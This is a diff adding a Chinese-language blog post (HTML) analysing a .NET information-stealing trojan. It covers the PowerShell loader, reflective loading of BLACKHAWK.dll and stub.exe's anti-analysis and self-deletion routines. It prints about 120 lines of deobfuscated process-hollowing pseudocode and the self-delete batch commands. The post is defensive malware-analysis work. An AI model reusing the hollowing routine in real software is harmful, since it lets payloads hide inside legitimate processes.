@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content=".NET 窃密木马分析一些基本概念：  CLI(Common Language Infrastructure,通用语言框架)：提供了一套可执行代码和它所运行需要的虚拟执行环境的规范. CLR(Common Language Runtime,公共语言运行时)：和Java虚拟机一样也是一个运行时环境，负责资源管理(内存分配和垃圾收集)，并保证应用和底层操作系统之间必要的分离。 C++ &#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content=".NET 窃密木马分析">
+<meta property="og:url" content="https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/index.html">
+<meta property="og:site_name" content="wooo~ Exploooosion&#39;s blog">
+<meta property="og:description" content=".NET 窃密木马分析一些基本概念：  CLI(Common Language Infrastructure,通用语言框架)：提供了一套可执行代码和它所运行需要的虚拟执行环境的规范. CLR(Common Language Runtime,公共语言运行时)：和Java虚拟机一样也是一个运行时环境，负责资源管理(内存分配和垃圾收集)，并保证应用和底层操作系统之间必要的分离。 C++ &#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://exploo0osion.github.io/image/2026-03-28-Csharpreverse_1/1774690956366.png">
+<meta property="og:image" content="https://exploo0osion.github.io/image/2026-03-28-Csharpreverse_1/1774691074383.png">
+<meta property="og:image" content="https://exploo0osion.github.io/image/2026-03-28-Csharpreverse_1/1774691490536.png">
+<meta property="og:image" content="https://exploo0osion.github.io/image/2026-03-28-Csharpreverse_1/1774755635307.png">
+<meta property="og:image" content="https://exploo0osion.github.io/image/2026-03-28-Csharpreverse_1/1774756819894.png">
+<meta property="og:image" content="https://exploo0osion.github.io/image/2026-03-28-Csharpreverse_1/1774756852744.png">
+<meta property="og:image" content="https://exploo0osion.github.io/image/2026-03-28-Csharpreverse_1/1774771598627.png">
+<meta property="og:image" content="https://exploo0osion.github.io/image/2026-03-28-Csharpreverse_1/1774772026326.png">
+<meta property="og:image" content="https://exploo0osion.github.io/image/2026-03-28-Csharpreverse_1/1774772615586.png">
+<meta property="og:image" content="https://exploo0osion.github.io/image/2026-03-28-Csharpreverse_1/1774772698604.png">
+<meta property="article:published_time" content="2026-03-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-30T07:33:34.084Z">
+<meta property="article:author" content="Exploooosion">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://exploo0osion.github.io/image/2026-03-28-Csharpreverse_1/1774690956366.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>.NET 窃密木马分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/friends/">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/03/26/2026-03-26-r77rootkit/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&text=.NET 窃密木马分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&title=.NET 窃密木马分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&is_video=false&description=.NET 窃密木马分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=.NET 窃密木马分析&body=Check out this article: https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&title=.NET 窃密木马分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&title=.NET 窃密木马分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&title=.NET 窃密木马分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&title=.NET 窃密木马分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&name=.NET 窃密木马分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&t=.NET 窃密木马分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NET-%E7%AA%83%E5%AF%86%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">.NET 窃密木马分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BLACKHAWK-dll"><span class="toc-number">1.1.</span> <span class="toc-text">BLACKHAWK.dll</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stub-exe"><span class="toc-number">1.2.</span> <span class="toc-text">stub.exe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">反分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NET-hook"><span class="toc-number">1.2.2.</span> <span class="toc-text">.NET hook</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        .NET 窃密木马分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Exploooosion</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-03-27T16:00:00.000Z" class="dt-published" itemprop="datePublished">2026-03-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/malware/">malware</a> › <a class="category-link" href="/categories/malware/windows/">windows</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <span id="more"></span>
+
+<h1 id="NET-窃密木马分析"><a href="#NET-窃密木马分析" class="headerlink" title=".NET 窃密木马分析"></a>.NET 窃密木马分析</h1><p>一些基本概念：</p>
+<ul>
+<li>CLI(Common Language Infrastructure,通用语言框架)：提供了一套可执行代码和它所运行需要的虚拟执行环境的规范.</li>
+<li>CLR(Common Language Runtime,公共语言运行时)：和Java虚拟机一样也是一个运行时环境，负责资源管理(内存分配和垃圾收集)，并保证应用和底层操作系统之间必要的分离。</li>
+<li>C++ &#x2F;CLI：实现了C和.NET的无缝连接，可以使用C和C#混合的方式来完成应用程序代码的编写。</li>
+<li>.NET程序编译运行流程：将源代码编译为微软中间语言MSIL，运行的时候即时编译为本地机器语言，同时.NET代码运行时有一个CLR环境来管理程序。</li>
+</ul>
+<p>该木马前序有一个wsf（Windows Script File）脚本嵌入混淆 JScript 从网上落地一个powershell脚本并执行。</p>
+<p>使用 RC4 算法解密内嵌脚本并执行，无磁盘文件落地。</p>
+<p><img src="/image/2026-03-28-Csharpreverse_1/1774690956366.png" alt="1774690956366"></p>
+<p>脚本检查目标进程 <code>aspnet_compiler.exe</code>是否存在，将内嵌的 <code>BLACKHAWK.dll</code> 反射加载到当前 PowerShell 进程，调用 <code>BLACKHAWK.DOWN::SHOOT()</code>，把第二阶段 PE 字节注入到指定宿主进程 <code>aspnet_compiler.exe</code>。</p>
+<p>脚本定义了 <code>Invoke-ManagedAssembly</code>：</p>
+<ul>
+<li>使用 <code>[System.Reflection.Assembly]::Load($RawAssemblyBytes)</code> 载入内嵌程序集</li>
+<li>用 <code>GetType()</code> 与 <code>GetMethod()</code> 查找公开静态方法</li>
+<li>调用 <code>MethodInfo.Invoke($null, $MethodArguments)</code></li>
+</ul>
+<p><img src="/image/2026-03-28-Csharpreverse_1/1774691074383.png" alt="1774691074383"></p>
+<h2 id="BLACKHAWK-dll"><a href="#BLACKHAWK-dll" class="headerlink" title="BLACKHAWK.dll"></a>BLACKHAWK.dll</h2><p>使用dnspy反编译出来的程序存在控制流平坦化，直接接入dnspy-mcp解决。</p>
+<p><img src="/image/2026-03-28-Csharpreverse_1/1774691490536.png" alt="1774691490536"></p>
+<p>去混淆后的伪代码如下，本质上是挂起宿主进程并进行process hollowing：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">SHOOT</span>(<span class="params">path, payload</span>):</span></span><br><span class="line"><span class="function">    retryCount</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> retryCount &lt; <span class="number">5</span>:</span><br><span class="line">        startupInfo.cb = <span class="keyword">sizeof</span>(STARTUPINFO)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            success = CreateProcessA(</span><br><span class="line">                applicationName = path,</span><br><span class="line">                commandLine = <span class="string">&quot;&quot;</span>,</span><br><span class="line">                processAttributes = NULL,</span><br><span class="line">                threadAttributes = NULL,</span><br><span class="line">                inheritHandles = <span class="literal">false</span>,</span><br><span class="line">                creationFlags = CREATE_SUSPENDED | CREATE_NO_WINDOW,</span><br><span class="line">                environment = NULL,</span><br><span class="line">                currentDirectory = NULL,</span><br><span class="line">                startupInfo,</span><br><span class="line">                processInfo</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> success:</span><br><span class="line">                <span class="keyword">throw</span> Exception()</span><br><span class="line"></span><br><span class="line">            peHeaderOffset   = ReadInt32(payload, <span class="number">0x3C</span>)             <span class="comment">// e_lfanew</span></span><br><span class="line">            imageBase        = ReadInt32(payload, peHeaderOffset + <span class="number">0x34</span>)</span><br><span class="line">            entryPointRva    = ReadInt32(payload, peHeaderOffset + <span class="number">0x28</span>)</span><br><span class="line">            sizeOfImage      = ReadInt32(payload, peHeaderOffset + <span class="number">0x50</span>)</span><br><span class="line">            sizeOfHeaders    = ReadInt32(payload, peHeaderOffset + <span class="number">0x54</span>)</span><br><span class="line">            numberOfSections = ReadInt16(payload, peHeaderOffset + <span class="number">0x06</span>)</span><br><span class="line">            sectionOffset    = peHeaderOffset + <span class="number">0xF8</span>                <span class="comment">// 节表起始</span></span><br><span class="line"></span><br><span class="line">            context = <span class="keyword">new</span> CONTEXT_BUFFER()</span><br><span class="line">            context[<span class="number">0</span>] = CONTEXT_FULL</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> IntPtr.Size == <span class="number">4</span>:</span><br><span class="line">                ok = GetThreadContext(processInfo.hThread, context)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ok = Wow64GetThreadContext(processInfo.hThread, context)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">                <span class="keyword">throw</span> Exception()</span><br><span class="line"></span><br><span class="line">            pebAddress = context[<span class="number">41</span>]</span><br><span class="line">            originalImageBase = ReadProcessMemory(</span><br><span class="line">                processInfo.hProcess,</span><br><span class="line">                pebAddress + <span class="number">8</span>,</span><br><span class="line">                <span class="number">4</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> originalImageBase == imageBase:</span><br><span class="line">                ok = ZwUnmapViewOfSection(processInfo.hProcess, originalImageBase)</span><br><span class="line">                <span class="keyword">if</span> ok != <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">throw</span> Exception()</span><br><span class="line"></span><br><span class="line">            remoteBase = VirtualAllocEx(</span><br><span class="line">                processInfo.hProcess,</span><br><span class="line">                imageBase,</span><br><span class="line">                sizeOfImage,</span><br><span class="line">                MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">                PAGE_EXECUTE_READWRITE</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> remoteBase == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">throw</span> Exception()</span><br><span class="line"></span><br><span class="line">            ok = WriteProcessMemory(</span><br><span class="line">                processInfo.hProcess,</span><br><span class="line">                remoteBase,</span><br><span class="line">                payload,</span><br><span class="line">                sizeOfHeaders</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">                <span class="keyword">throw</span> Exception()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">from</span> <span class="number">0</span> to numberOfSections - <span class="number">1</span>:</span><br><span class="line">                virtualAddress  = ReadInt32(payload, sectionOffset + <span class="number">0x0C</span>)</span><br><span class="line">                rawSize         = ReadInt32(payload, sectionOffset + <span class="number">0x10</span>)</span><br><span class="line">                rawOffset       = ReadInt32(payload, sectionOffset + <span class="number">0x14</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> rawSize != <span class="number">0</span>:</span><br><span class="line">                    sectionData = CopyBytes(payload, rawOffset, rawSize)</span><br><span class="line"></span><br><span class="line">                    ok = WriteProcessMemory(</span><br><span class="line">                        processInfo.hProcess,</span><br><span class="line">                        remoteBase + virtualAddress,</span><br><span class="line">                        sectionData,</span><br><span class="line">                        rawSize</span><br><span class="line">                    )</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">                        <span class="keyword">throw</span> Exception()</span><br><span class="line"></span><br><span class="line">                sectionOffset += <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">            ok = WriteProcessMemory(</span><br><span class="line">                processInfo.hProcess,</span><br><span class="line">                pebAddress + <span class="number">8</span>,</span><br><span class="line">                Int32ToBytes(remoteBase),</span><br><span class="line">                <span class="number">4</span></span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">                <span class="keyword">throw</span> Exception()</span><br><span class="line"></span><br><span class="line">            context[<span class="number">44</span>] = remoteBase + entryPointRva</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> IntPtr.Size == <span class="number">4</span>:</span><br><span class="line">                ok = SetThreadContext(processInfo.hThread, context)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ok = Wow64SetThreadContext(processInfo.hThread, context)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> ok:</span><br><span class="line">                <span class="keyword">throw</span> Exception()</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">if</span> <span class="title">ResumeThread</span>(<span class="params">processInfo.hThread</span>)</span> == <span class="number">-1</span>:</span><br><span class="line">                <span class="keyword">throw</span> Exception()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">catch</span>:</span><br><span class="line">            KillProcessById(processInfo.dwProcessId)</span><br><span class="line">            retryCount += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="stub-exe"><a href="#stub-exe" class="headerlink" title="stub.exe"></a>stub.exe</h2><p>MutexControl.Check()：用 <code>Config.Mutex</code> 创建互斥体，若互斥已存在则直接退出，当前样本互斥名为：</p>
+<ul>
+<li><code>5EUV2NE8WAZNK6134F5Z</code></li>
+</ul>
+<p>后续会根据配置信息执行特定的业务。</p>
+<p>若 <code>Config.AntiAnalysis == &quot;1&quot;</code>，执行 <code>AntiAnalysis.Run()</code>，如命中规则则 <code>SelfDestruct.Melt()</code></p>
+<h3 id="反分析"><a href="#反分析" class="headerlink" title="反分析"></a>反分析</h3><p>这一块的代码似乎写的有问题，导致实际上并不能达成效果。</p>
+<p>其按顺序执行：</p>
+<p>HostingAsync()调试的时候发现这里执行错误，密文字节是26 不是 16 的倍数。</p>
+<p><img src="/image/2026-03-28-Csharpreverse_1/1774755635307.png" alt="1774755635307"></p>
+<p>SuspiciousGPU()</p>
+<p>通过 WMI (Windows Management Instrumentation) 查询系统的 显卡 (GPU) 信息。</p>
+<p>把实际 GPU 名称转换为小写，但名单中大量条目仍保留原始大小写。</p>
+<p><img src="/image/2026-03-28-Csharpreverse_1/1774756819894.png" alt="1774756819894"></p>
+<p>SuspiciousProcess()虽然意图通过字符串匹配查询是否存在一些特殊进程，但是硬编码的字符串是大小写混合的，而 <code>ProcessName</code> 默认不包含 <code>.exe</code>，并且实际值还会被转成小写，该检测始终无法匹配。</p>
+<p><img src="/image/2026-03-28-Csharpreverse_1/1774756852744.png" alt="1774756852744"></p>
+<p>SuspiciousService()</p>
+<p><img src="/image/2026-03-28-Csharpreverse_1/1774771598627.png" alt="1774771598627"></p>
+<p>SandBox()</p>
+<p><img src="/image/2026-03-28-Csharpreverse_1/1774772026326.png" alt="1774772026326"></p>
+<p>Emulator()通过时间检测判断是否进行加速。</p>
+<p><img src="/image/2026-03-28-Csharpreverse_1/1774772615586.png" alt="1774772615586"></p>
+<p>SuspiciousIP()、SuspiciousPCName()、SuspiciousPCUsername()、SuspiciousMachineGuid()都是通过信息搜集进行的检查和判断。</p>
+<p>任意一项命中后，调用 <code>Stub.SelfDestruct::Melt()</code>，其会在 <code>%TEMP%</code> 下写入随机 <code>.bat</code></p>
+<p><code>.bat</code> 中包含：</p>
+<ul>
+<li><code>taskkill /F /PID &lt;当前进程&gt;</code></li>
+<li><code>timeout /T 2 /NOBREAK &gt; NUL</code></li>
+<li><code>del /F /Q &quot;&lt;bat路径&gt;&quot;</code></li>
+</ul>
+<p>隐藏启动 <code>cmd.exe /C</code></p>
+<ul>
+<li><code>Thread.Sleep(5000)</code></li>
+<li><code>Environment.FailFast(null)</code></li>
+</ul>
+<p><img src="/image/2026-03-28-Csharpreverse_1/1774772698604.png" alt="1774772698604"></p>
+<p>后续就是一堆信息搜集的功能。</p>
+<h3 id="NET-hook"><a href="#NET-hook" class="headerlink" title=".NET hook"></a>.NET hook</h3>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/friends/">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NET-%E7%AA%83%E5%AF%86%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">.NET 窃密木马分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BLACKHAWK-dll"><span class="toc-number">1.1.</span> <span class="toc-text">BLACKHAWK.dll</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stub-exe"><span class="toc-number">1.2.</span> <span class="toc-text">stub.exe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">反分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NET-hook"><span class="toc-number">1.2.2.</span> <span class="toc-text">.NET hook</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&text=.NET 窃密木马分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&title=.NET 窃密木马分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&is_video=false&description=.NET 窃密木马分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=.NET 窃密木马分析&body=Check out this article: https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&title=.NET 窃密木马分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&title=.NET 窃密木马分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&title=.NET 窃密木马分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&title=.NET 窃密木马分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&name=.NET 窃密木马分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://exploo0osion.github.io/2026/03/28/2026-03-28-Csharpreverse_1/&t=.NET 窃密木马分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
